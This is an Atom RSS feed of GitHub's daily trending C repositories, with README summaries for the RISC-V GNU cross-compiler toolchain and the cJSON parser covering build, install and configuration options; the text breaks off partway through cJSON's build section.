<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-03T01:34:42Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>riscv-collab/riscv-gnu-toolchain</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/riscv-collab/riscv-gnu-toolchain</id>
    <link href="https://github.com/riscv-collab/riscv-gnu-toolchain" rel="alternate"></link>
    <summary type="html">&lt;p&gt;GNU toolchain for RISC-V, including GCC&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;RISC-V GNU Compiler Toolchain&lt;/h1&gt; &#xA;&lt;p&gt;This is the RISC-V C and C++ cross-compiler. It supports two build modes: a generic ELF/Newlib toolchain and a more sophisticated Linux-ELF/glibc toolchain.&lt;/p&gt; &#xA;&lt;h3&gt;Getting the sources&lt;/h3&gt; &#xA;&lt;p&gt;This repository uses submodules, but submodules will fetch automatically on demand, so &lt;code&gt;--recursive&lt;/code&gt; or &lt;code&gt;git submodule update --init --recursive&lt;/code&gt; is not needed.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/riscv/riscv-gnu-toolchain&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Warning: git clone takes around 6.65 GB of disk and download size&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Prerequisites&lt;/h3&gt; &#xA;&lt;p&gt;Several standard packages are needed to build the toolchain.&lt;/p&gt; &#xA;&lt;p&gt;On Ubuntu, executing the following command should suffice:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ sudo apt-get install autoconf automake autotools-dev curl python3 libmpc-dev libmpfr-dev libgmp-dev gawk build-essential bison flex texinfo gperf libtool patchutils bc zlib1g-dev libexpat-dev&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On Fedora/CentOS/RHEL OS, executing the following command should suffice:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ sudo yum install autoconf automake python3 libmpc-devel mpfr-devel gmp-devel gawk  bison flex texinfo patchutils gcc gcc-c++ zlib-devel expat-devel&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On Arch Linux, executing the following command should suffice:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ sudo pacman -Syyu autoconf automake curl python3 libmpc mpfr gmp gawk base-devel bison flex texinfo gperf libtool patchutils bc zlib expat&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Also available for Arch users on the AUR: &lt;a href=&#34;https://aur.archlinux.org/packages/riscv-gnu-toolchain/&#34;&gt;https://aur.archlinux.org/packages/riscv-gnu-toolchain/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;On OS X, you can use &lt;a href=&#34;http://brew.sh&#34;&gt;Homebrew&lt;/a&gt; to install the dependencies:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ brew install python3 gawk gnu-sed gmp mpfr libmpc isl zlib expat&#xA;$ brew tap discoteq/discoteq&#xA;$ brew install flock&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To build the glibc (Linux) on OS X, you will need to build within a case-sensitive file system. The simplest approach is to create and mount a new disk image with a case sensitive format. Make sure that the mount point does not contain spaces. This is not necessary to build newlib or gcc itself on OS X.&lt;/p&gt; &#xA;&lt;p&gt;This process will start by downloading about 200 MiB of upstream sources, then will patch, build, and install the toolchain. If a local cache of the upstream sources exists in $(DISTDIR), it will be used; the default location is /var/cache/distfiles. Your computer will need about 8 GiB of disk space to complete the process.&lt;/p&gt; &#xA;&lt;h3&gt;Installation (Newlib)&lt;/h3&gt; &#xA;&lt;p&gt;To build the Newlib cross-compiler, pick an install path. If you choose, say, &lt;code&gt;/opt/riscv&lt;/code&gt;, then add &lt;code&gt;/opt/riscv/bin&lt;/code&gt; to your &lt;code&gt;PATH&lt;/code&gt; now. Then, simply run the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --prefix=/opt/riscv&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should now be able to use riscv64-unknown-elf-gcc and its cousins.&lt;/p&gt; &#xA;&lt;h3&gt;Installation (Linux)&lt;/h3&gt; &#xA;&lt;p&gt;To build the Linux cross-compiler, pick an install path. If you choose, say, &lt;code&gt;/opt/riscv&lt;/code&gt;, then add &lt;code&gt;/opt/riscv/bin&lt;/code&gt; to your &lt;code&gt;PATH&lt;/code&gt; now. Then, simply run the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --prefix=/opt/riscv&#xA;make linux&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The build defaults to targeting RV64GC (64-bit) with glibc, even on a 32-bit build environment. To build the 32-bit RV32GC toolchain, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --prefix=/opt/riscv --with-arch=rv32gc --with-abi=ilp32d&#xA;make linux&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In case you prefer musl libc over glibc, configure just like above and opt for &lt;code&gt;make musl&lt;/code&gt; instead of &lt;code&gt;make linux&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Supported architectures are rv32i or rv64i plus standard extensions (a)tomics, (m)ultiplication and division, (f)loat, (d)ouble, or (g)eneral for MAFD.&lt;/p&gt; &#xA;&lt;p&gt;Supported ABIs are ilp32 (32-bit soft-float), ilp32d (32-bit hard-float), ilp32f (32-bit with single-precision in registers and double in memory, niche use only), lp64 lp64f lp64d (same but with 64-bit long and pointers).&lt;/p&gt; &#xA;&lt;h3&gt;Installation (Newlib/Linux multilib)&lt;/h3&gt; &#xA;&lt;p&gt;To build either cross-compiler with support for both 32-bit and 64-bit, run the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --prefix=/opt/riscv --enable-multilib&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And then either &lt;code&gt;make&lt;/code&gt;, &lt;code&gt;make linux&lt;/code&gt; or &lt;code&gt;make musl&lt;/code&gt; for the Newlib, Linux glibc-based or Linux musl libc-based cross-compiler, respectively.&lt;/p&gt; &#xA;&lt;p&gt;The multilib compiler will have the prefix riscv64-unknown-elf- or riscv64-unknown-linux-gnu- but will be able to target both 32-bit and 64-bit systems. It will support the most common &lt;code&gt;-march&lt;/code&gt;/&lt;code&gt;-mabi&lt;/code&gt; options, which can be seen by using the &lt;code&gt;--print-multi-lib&lt;/code&gt; flag on either cross-compiler.&lt;/p&gt; &#xA;&lt;p&gt;The musl compiler (riscv64-unknown-linux-musl-) will only be able to target 64-bit systems due to limitations in the upstream musl architecture support. The &lt;code&gt;--enable-multilib&lt;/code&gt; flag therefore does not actually enable multilib support for musl libc.&lt;/p&gt; &#xA;&lt;h3&gt;Troubleshooting Build Problems&lt;/h3&gt; &#xA;&lt;p&gt;Builds work best if installing into an empty directory. If you build a hard-float toolchain and then try to build a soft-float toolchain with the same --prefix directory, then the build scripts may get confused and exit with a linker error complaining that hard float code can&#39;t be linked with soft float code. Removing the existing toolchain first, or using a different prefix for the second build, avoids the problem. It is OK to build one newlib and one linux toolchain with the same prefix. But you should avoid building two newlib or two linux toolchains with the same prefix.&lt;/p&gt; &#xA;&lt;p&gt;If building a linux toolchain on a MacOS system, or on a Windows system using the Linux subsystem or cygwin, you must ensure that the filesystem is case-sensitive. A build on a case-insensitive filesystem will fail when building glibc because *.os and *.oS files will clobber each other during the build eventually resulting in confusing link errors.&lt;/p&gt; &#xA;&lt;p&gt;Centos (and RHEL) provide old GNU tools versions that may be too old to build a RISC-V toolchain. There is an alternate toolset provided that includes current versions of the GNU tools. This is the devtoolset provided as part of the Software Collection service. For more info, see the &lt;a href=&#34;https://www.softwarecollections.org/en/scls/rhscl/devtoolset-7/&#34;&gt;devtoolset-7&lt;/a&gt; URL. There are various versions of the devtoolset that are available, so you can also try other versions of it, but we have at least one report that devtoolset-7 works.&lt;/p&gt; &#xA;&lt;h3&gt;Advanced Options&lt;/h3&gt; &#xA;&lt;p&gt;There are a number of additional options that may be passed to configure. See &#39;./configure --help&#39; for more details.&lt;/p&gt; &#xA;&lt;h4&gt;Set default ISA spec version&lt;/h4&gt; &#xA;&lt;p&gt;&lt;code&gt;--with-isa-spec=&lt;/code&gt; can specify the default version of the RISC-V Unprivileged (formerly User-Level) ISA specification.&lt;/p&gt; &#xA;&lt;p&gt;Possible options are: &lt;code&gt;2.2&lt;/code&gt;, &lt;code&gt;20190608&lt;/code&gt; and &lt;code&gt;20191213&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The default version is &lt;code&gt;2.2&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;More details about this option you can refer this post &lt;a href=&#34;https://groups.google.com/a/groups.riscv.org/g/sw-dev/c/aE1ZeHHCYf4&#34;&gt;RISC-V GNU toolchain bumping default ISA spec to 20191213&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Build with customized multi-lib configure.&lt;/h4&gt; &#xA;&lt;p&gt;&lt;code&gt;--with-multilib-generator=&lt;/code&gt; can specify what multilibs to build. The argument is a semicolon separated list of values, possibly consisting of a single value. Currently only supported for riscv*-&lt;em&gt;-elf&lt;/em&gt;. The accepted values and meanings are given below.&lt;/p&gt; &#xA;&lt;p&gt;Every config is constructed with four components: architecture string, ABI, reuse rule with architecture string and reuse rule with sub-extension.&lt;/p&gt; &#xA;&lt;p&gt;Re-use part support expansion operator (*) to simplify the combination of different sub-extensions, example 4 demonstrate how it uses and works.&lt;/p&gt; &#xA;&lt;p&gt;Example 1: Add multi-lib support for rv32i with ilp32.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --with-multilib-generator=&#34;rv32i-ilp32--&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example 2: Add multi-lib support for rv32i with ilp32 and rv32imafd with ilp32.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --with-multilib-generator=&#34;rv32i-ilp32--;rv32imafd-ilp32--&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example 3: Add multi-lib support for rv32i with ilp32; rv32im with ilp32 and rv32ic with ilp32 will reuse this multi-lib set.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --with-multilib-generator=&#34;rv32i-ilp32-rv32im-c&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example 4: Add multi-lib support for rv64ima with lp64; rv64imaf with lp64, rv64imac with lp64 and rv64imafc with lp64 will reuse this multi-lib set.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --with-multilib-generator=&#34;rv64ima-lp64--f*c&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Test Suite&lt;/h3&gt; &#xA;&lt;p&gt;The Dejagnu test suite has been ported to RISC-V. This can be run with a simulator for the elf and linux toolchains. The simulator can be selected by the SIM variable in the Makefile, e.g. SIM=qemu, SIM=gdb, or SIM=spike (experimental).In addition, the simulator can also be selected with the configure time option &lt;code&gt;--with-sim=&lt;/code&gt;.However, the testsuite allowlist is only mintained for qemu.Other simulators might get extra failures. To test GCC, run the following commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --prefix=$RISCV --disable-linux --with-arch=rv64ima # or --with-arch=rv32ima&#xA;make newlib&#xA;make report-newlib SIM=gdb # Run with gdb simulator&#xA;&#xA;./configure --prefix=$RISCV&#xA;make linux&#xA;make report-linux SIM=qemu # Run with qemu&#xA;&#xA;./configure --prefix=$RISCV --with-sim=spike&#xA;make linux&#xA;make report               # Run with spike&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;spike only support rv64* bare-metal/elf toolchain.&lt;/li&gt; &#xA; &lt;li&gt;gdb simulator only support bare-metal/elf toolchain.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Development&lt;/h3&gt; &#xA;&lt;p&gt;This section is only for developer or advanced user, or you want to build toolchain with your own source tree.&lt;/p&gt; &#xA;&lt;h4&gt;Update Source Tree&lt;/h4&gt; &#xA;&lt;p&gt;&lt;code&gt;riscv-gnu-toolchain&lt;/code&gt; contain stable but not latest source for each submodule, in case you want to using latest develoment tree, you can use following command to upgrade all submodule.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git submodule update --remote&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or you can upgrade specific submodule only.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git submodule update --remote &amp;lt;component&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For example, upgrade riscv-gcc only, you can using following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git submodule update --remote riscv-gcc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;How to Check Which Branch are Used for Specific submodule&lt;/h4&gt; &#xA;&lt;p&gt;The branch info has recorded in &lt;code&gt;.gitmodules&lt;/code&gt; file, which can set or update via &lt;code&gt;git submodule add -b&lt;/code&gt; or &lt;code&gt;git submodule set-branch&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;However the only way to check which branch are using is to check &lt;code&gt;.gitmodules&lt;/code&gt; file, here is the example for &lt;code&gt;riscv-gcc&lt;/code&gt;, it using riscv-gcc-10.2.0 branch, so it will has a section named &lt;code&gt;riscv-gcc&lt;/code&gt; and has a field &lt;code&gt;branch&lt;/code&gt; is &lt;code&gt;riscv-gcc-10.2.0&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[submodule &#34;riscv-gcc&#34;]&#xA;        path = riscv-gcc&#xA;        url = ../riscv-gcc.git&#xA;        branch = riscv-gcc-10.2.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Use Source Tree Other Than &lt;code&gt;riscv-gnu-toolchain&lt;/code&gt;&lt;/h4&gt; &#xA;&lt;p&gt;&lt;code&gt;riscv-gnu-toolchain&lt;/code&gt; also support using out-of-tree source to build toolchain, there is couple configure option to specify the source tree of each submodule/component.&lt;/p&gt; &#xA;&lt;p&gt;For example you have a gcc in &lt;code&gt;$HOME/gcc&lt;/code&gt;, use &lt;code&gt;--with-gcc-src&lt;/code&gt; can specify that:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./configure --with-gcc-src=$HOME/gcc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here is the list of configure option for specify source tree:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;--with-gcc-src&#xA;--with-binutils-src&#xA;--with-newlib-src&#xA;--with-glibc-src&#xA;--with-musl-src&#xA;--with-gdb-src&#xA;--with-linux-headers-src&#xA;--with-qemu-src&#xA;--with-spike-src&#xA;--with-pk-src&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>DaveGamble/cJSON</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/DaveGamble/cJSON</id>
    <link href="https://github.com/DaveGamble/cJSON" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Ultralightweight JSON parser in ANSI C&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;cJSON&lt;/h1&gt; &#xA;&lt;p&gt;Ultralightweight JSON parser in ANSI C.&lt;/p&gt; &#xA;&lt;h2&gt;Table of contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#usage&#34;&gt;Usage&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#welcome-to-cjson&#34;&gt;Welcome to cJSON&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#building&#34;&gt;Building&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#copying-the-source&#34;&gt;Copying the source&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#cmake&#34;&gt;CMake&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#makefile&#34;&gt;Makefile&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#Vcpkg&#34;&gt;Vcpkg&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#including-cjson&#34;&gt;Including cJSON&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#data-structure&#34;&gt;Data Structure&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#working-with-the-data-structure&#34;&gt;Working with the data structure&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#basic-types&#34;&gt;Basic types&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#arrays&#34;&gt;Arrays&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#objects&#34;&gt;Objects&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#parsing-json&#34;&gt;Parsing JSON&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#printing-json&#34;&gt;Printing JSON&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#example&#34;&gt;Example&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#printing&#34;&gt;Printing&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#parsing&#34;&gt;Parsing&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#caveats&#34;&gt;Caveats&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#zero-character&#34;&gt;Zero Character&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#character-encoding&#34;&gt;Character Encoding&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#c-standard&#34;&gt;C Standard&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#floating-point-numbers&#34;&gt;Floating Point Numbers&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#deep-nesting-of-arrays-and-objects&#34;&gt;Deep Nesting Of Arrays And Objects&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#thread-safety&#34;&gt;Thread Safety&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#case-sensitivity&#34;&gt;Case Sensitivity&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#duplicate-object-members&#34;&gt;Duplicate Object Members&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/#enjoy-cjson&#34;&gt;Enjoy cJSON!&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;MIT License&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Copyright (c) 2009-2017 Dave Gamble and cJSON contributors&lt;/p&gt; &#xA; &lt;p&gt;Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the &#34;Software&#34;), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:&lt;/p&gt; &#xA; &lt;p&gt;The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.&lt;/p&gt; &#xA; &lt;p&gt;THE SOFTWARE IS PROVIDED &#34;AS IS&#34;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Welcome to cJSON.&lt;/h3&gt; &#xA;&lt;p&gt;cJSON aims to be the dumbest possible parser that you can get your job done with. It&#39;s a single file of C, and a single header file.&lt;/p&gt; &#xA;&lt;p&gt;JSON is described best here: &lt;a href=&#34;http://www.json.org/&#34;&gt;http://www.json.org/&lt;/a&gt; It&#39;s like XML, but fat-free. You use it to move data around, store things, or just generally represent your program&#39;s state.&lt;/p&gt; &#xA;&lt;p&gt;As a library, cJSON exists to take away as much legwork as it can, but not get in your way. As a point of pragmatism (i.e. ignoring the truth), I&#39;m going to say that you can use it in one of two modes: Auto and Manual. Let&#39;s have a quick run-through.&lt;/p&gt; &#xA;&lt;p&gt;I lifted some JSON from this page: &lt;a href=&#34;http://www.json.org/fatfree.html&#34;&gt;http://www.json.org/fatfree.html&lt;/a&gt; That page inspired me to write cJSON, which is a parser that tries to share the same philosophy as JSON itself. Simple, dumb, out of the way.&lt;/p&gt; &#xA;&lt;h3&gt;Building&lt;/h3&gt; &#xA;&lt;p&gt;There are several ways to incorporate cJSON into your project.&lt;/p&gt; &#xA;&lt;h4&gt;copying the source&lt;/h4&gt; &#xA;&lt;p&gt;Because the entire library is only one C file and one header file, you can just copy &lt;code&gt;cJSON.h&lt;/code&gt; and &lt;code&gt;cJSON.c&lt;/code&gt; to your projects source and start using it.&lt;/p&gt; &#xA;&lt;p&gt;cJSON is written in ANSI C (C89) in order to support as many platforms and compilers as possible.&lt;/p&gt; &#xA;&lt;h4&gt;CMake&lt;/h4&gt; &#xA;&lt;p&gt;With CMake, cJSON supports a full blown build system. This way you get the most features. CMake with an equal or higher version than 2.8.5 is supported. With CMake it is recommended to do an out of tree build, meaning the compiled files are put in a directory separate from the source files. So in order to build cJSON with CMake on a Unix platform, make a &lt;code&gt;build&lt;/code&gt; directory and run CMake inside it.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;mkdir build&#xA;cd build&#xA;cmake ..&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will create a Makefile and a bunch of other files. You can then compile it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And install it with &lt;code&gt;make install&lt;/code&gt; if you want. By default it installs the headers &lt;code&gt;/usr/local/include/cjson&lt;/code&gt; and the libraries to &lt;code&gt;/usr/local/lib&lt;/code&gt;. It also installs files for pkg-config to make it easier to detect and use an existing installation of CMake. And it installs CMake config files, that can be used by other CMake based projects to discover the library.&lt;/p&gt; &#xA;&lt;p&gt;You can change the build process with a list of different options that you can pass to CMake. Turn them on with &lt;code&gt;On&lt;/code&gt; and off with &lt;code&gt;Off&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_CJSON_TEST=On&lt;/code&gt;: Enable building the tests. (on by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_CJSON_UTILS=On&lt;/code&gt;: Enable building cJSON_Utils. (off by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_TARGET_EXPORT=On&lt;/code&gt;: Enable the export of CMake targets. Turn off if it makes problems. (on by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_CUSTOM_COMPILER_FLAGS=On&lt;/code&gt;: Enable custom compiler flags (currently for Clang, GCC and MSVC). Turn off if it makes problems. (on by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_VALGRIND=On&lt;/code&gt;: Run tests with &lt;a href=&#34;http://valgrind.org&#34;&gt;valgrind&lt;/a&gt;. (off by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_SANITIZERS=On&lt;/code&gt;: Compile cJSON with &lt;a href=&#34;https://github.com/google/sanitizers/wiki/AddressSanitizer&#34;&gt;AddressSanitizer&lt;/a&gt; and &lt;a href=&#34;https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html&#34;&gt;UndefinedBehaviorSanitizer&lt;/a&gt; enabled (if possible). (off by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_SAFE_STACK&lt;/code&gt;: Enable the &lt;a href=&#34;https://clang.llvm.org/docs/SafeStack.html&#34;&gt;SafeStack&lt;/a&gt; instrumentation pass. Currently only works with the Clang compiler. (off by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DBUILD_SHARED_LIBS=On&lt;/code&gt;: Build the shared libraries. (on by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DBUILD_SHARED_AND_STATIC_LIBS=On&lt;/code&gt;: Build both shared and static libraries. (off by default)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DCMAKE_INSTALL_PREFIX=/usr&lt;/code&gt;: Set a prefix for the installation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_LOCALES=On&lt;/code&gt;: Enable the usage of localeconv method. ( on by default )&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DCJSON_OVERRIDE_BUILD_SHARED_LIBS=On&lt;/code&gt;: Enable overriding the value of &lt;code&gt;BUILD_SHARED_LIBS&lt;/code&gt; with &lt;code&gt;-DCJSON_BUILD_SHARED_LIBS&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;-DENABLE_CJSON_VERSION_SO&lt;/code&gt;: Enable cJSON so version. ( on by default )&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you are packaging cJSON for a distribution of Linux, you would probably take these steps for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;mkdir build&#xA;cd build&#xA;cmake .. -DENABLE_CJSON_UTILS=On -DENABLE_CJSON_TEST=Off -DCMAKE_INSTALL_PREFIX=/usr&#xA;make&#xA;make DESTDIR=$pkgdir install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On Windows CMake is usually used to create a Visual Studio solution file by running it inside the Developer Command Prompt for Visual Studio, for exact steps follow the official documentation from CMake and Microsoft and use the online search engine of your choice. The descriptions of the the options above still generally apply, although not all of them work on Windows.&lt;/p&gt; &#xA;&lt;h4&gt;Makefile&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; This Method is deprecated. Use CMake if at all possible. Makefile support is limited to fixing bugs.&lt;/p&gt; 